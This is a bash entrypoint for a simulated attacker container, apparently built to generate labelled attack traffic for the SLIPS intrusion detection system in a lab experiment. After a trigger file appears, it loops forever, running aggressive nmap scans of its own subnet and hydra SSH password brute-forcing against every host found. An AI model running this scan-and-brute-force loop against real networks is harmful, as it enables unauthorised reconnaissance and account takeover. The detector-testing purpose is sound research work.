#!/bin/bash
# Static attacker entrypoint — deterministic, mechanical, high-cadence.
# Every ATTACK_INTERVAL seconds (default 60) it runs a fresh nmap -sS -A
# sweep of its network subnet, followed by a dedicated SSH brute-forcing pass
# through nmap's ssh-brute NSE script driven with curated user/pass lists.
#
# Why this cadence: SLIPS fires alerts per (profile, timewindow) — fresh
# nmap evidence arriving each minute keeps every TW's attack-labelling alive
# (the FL module's alert-based labels depend on recurring evidence). The old
# 5-minute sweep left large label-less gaps in a 5-minute SLIPS time window;
# with this interval every window has new evidence, always.
#
# Baseline gating: stays quiet until the experiment runner creates
# /tmp/start_static_attacker at attack-phase start (same instant Aracne
# launches). Standalone: docker exec <c> touch /tmp/start_static_attacker
#
# Targets: derived from the container's own interface (no hardcoded IPs);
# override with TARGET_SUBNET. Cadence tunables: ATTACK_INTERVAL.
# Scans run at the IP layer (no ARP) so the sensors see conn flows, not ARP
# records; override NO_ARP="" to restore nmap's default local-segment ARP.

set -u

INTERFACE=$(ip route | awk '/default/ {for (i=1;i<=NF;i++) if ($i=="dev"){print $(i+1); exit}}')
INTERFACE=${INTERFACE:-eth0}
SUBNET=${TARGET_SUBNET:-$(ip -o -4 addr show "$INTERFACE" 2>/dev/null | awk '{print $4}')}
SUBNET=${SUBNET:-10.0.0.0/8}
INTERVAL=${ATTACK_INTERVAL:-60}
# Sweep breadth cap (per cycle): 1000-port sweeps drowned every labeling
# window in attacker flows; 50 keeps evidence cadence at ~20x less volume.
# MUST be assigned before any use (script runs with set -u).
TOP_PORTS=${TOP_PORTS:-50}
# IP-level scanning on the local segment. By default nmap on a same-subnet
# target does ARP host-discovery and resolves MACs via ARP, so the sensors
# see thousands of ARP records instead of conn flows. --disable-arp-ping
# uses ICMP/TCP for discovery; --send-ip forces IP-layer probe packets, so
# the scan surfaces as conn-flow evidence (portscan/related) the FL module
# actually ingests, not ARP-scan evidence it drops. Override NO_ARP="" to
# restore nmap's default ARP behaviour.
NO_ARP=${NO_ARP:---disable-arp-ping --send-ip}
NOW=$(date -u +%Y%m%d_%H%M%S)
LOG=/var/log/static_attacker/nmap_${NOW}.log
: > "$LOG"

# Canonicalize the password list once (nmap's passwords.lst carries comments)
PASSDB=/tmp/passwords.txt
grep -v -e '^#' -e '^$' /usr/share/nmap/nselib/data/passwords.lst > "$PASSDB" 2>/dev/null || \
  cp /usr/share/nmap/nselib/data/passwords.lst "$PASSDB"

echo "[static-attacker] interface=$INTERFACE subnet=$SUBNET interval=${INTERVAL}s log=$LOG" | tee -a "$LOG"

echo "[static-attacker] waiting for /tmp/start_static_attacker (attack phase start)..." | tee -a "$LOG"
while [ ! -f /tmp/start_static_attacker ]; do
  sleep 2
done
echo "[static-attacker] attack phase started — engaging" | tee -a "$LOG"

while true; do
  cycle=$(date -u +%F\ %T)
  echo "===== $cycle sweep $SUBNET (nmap -sS -A, top ${TOP_PORTS} ports, IP-level) =====" >> "$LOG"
  # aggressive SYN scan of the subnet: -A implies -sV/-O/script/traceroute;
  # -A is the mechanical part that feeds SLIPS's portscan/related alerts.
  # $NO_ARP keeps discovery and probes at the IP layer (conn flows, not ARP).
  nmap -sS -A -T4 $NO_ARP \
    --top-ports "$TOP_PORTS" \
    --exclude 127.0.0.0/8,localhost \
    "$SUBNET" >> "$LOG" 2>&1 || true

  echo "===== $cycle ssh-brute pass $SUBNET (nmap discover + hydra) =====" >> "$LOG"
  # SSH brute-forcing: nmap discovers live ssh services, hydra forces them
  # with the same curated lists. nmap's ssh-brute NSE script can't be used in
  # this image (libssh2-utility handshake error against OpenSSH >=8.9), so
  # hydra stands in while nmap keeps the discovery/drive responsibility.
  nmap -sS -T4 $NO_ARP -p 22 --open -oG - \
    --exclude 127.0.0.0/8,localhost \
    "$SUBNET" 2>/dev/null | awk '/22\/open/ {print $2}' > /tmp/ssh_targets.txt
  if [ -s /tmp/ssh_targets.txt ]; then
    while read -r host; do
      [ -n "$host" ] || continue
      echo "-- hydra ssh://$host (users=/root/users.txt, passes=passwords.lst)" >> "$LOG"
      timeout 45 hydra -L /root/users.txt -P "$PASSDB" \
        -t 4 -f -V "ssh://$host" >> "$LOG" 2>&1 || true
    done < /tmp/ssh_targets.txt
  else
    echo "-- no ssh services found on $SUBNET" >> "$LOG"
  fi
  echo "===== cycle done $(date -u +%F\ %T) =====" >> "$LOG"
  sleep "$INTERVAL"
done
